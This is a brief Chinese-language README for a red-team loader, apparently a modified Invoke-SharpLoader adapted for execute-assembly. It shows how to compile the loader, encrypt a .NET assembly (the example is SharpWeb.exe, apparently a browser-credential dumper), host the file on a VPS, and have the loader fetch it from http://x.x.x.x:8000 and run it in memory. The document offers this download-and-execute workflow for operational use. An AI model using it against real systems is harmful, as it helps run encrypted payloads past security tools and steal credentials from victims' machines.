原版项目：https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader

根据该项目进行改造c#代码，以适配execute-assembly使用，更方便红队日常工作
项目编译
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe Invoke-SharpLoader.csproj


使用方法
需要先加密
Invoke-SharpEncrypt -file C:\c#程序集\SharpWeb.exe -password mypassword -outfile C:\c#程序集\SharpWeb.enc
放到vps的远端访问目录  
Invoke_SharpLoader.exe http://x.x.x.x:8000/SharpWeb.enc mypassword args
![image](https://github.com/user-attachments/assets/44dd4fec-c0fa-44d3-a038-04aac94b0052)

